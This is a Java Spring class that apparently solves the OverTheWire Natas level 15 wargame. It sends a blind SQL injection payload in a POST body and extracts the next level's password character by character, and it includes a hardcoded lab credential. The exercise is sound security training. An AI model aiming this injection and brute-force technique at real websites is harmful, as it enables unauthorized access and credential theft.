package com.behnam.natas;

import org.springframework.http.*;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;

@Component
public class Natas15 {
    public boolean checkPassContain(String pass) {
        RestTemplate restTemplate = new RestTemplate();
        HttpHeaders headers = new HttpHeaders();
        headers.setBasicAuth("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J");
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        HttpEntity<String> entity = new HttpEntity<String>("username=natas16\" and password like BINARY \"" + pass + "%", headers);

        ResponseEntity<String> result =
                restTemplate.exchange("http://natas15.natas.labs.overthewire.org/index.php?debug",
                        HttpMethod.POST, entity, String.class);
        if ("This user exists.".equals(new String(result.getBody()).split("<br>")[1]))
            return true;
        else
            return false;
    }

    public void solve() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        String password="";
        for (int i=0;i<32;i++) {
            for (char c : chars.toCharArray()) {
                if (checkPassContain(password+(char) (c))) {
                    password = password+c;
                    System.out.println(password);
                }
            }
        }
        System.out.println();
//ABCEHIJMNOPQRTWabcehijmnopqrtw03569
//AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
//WA
    }
}
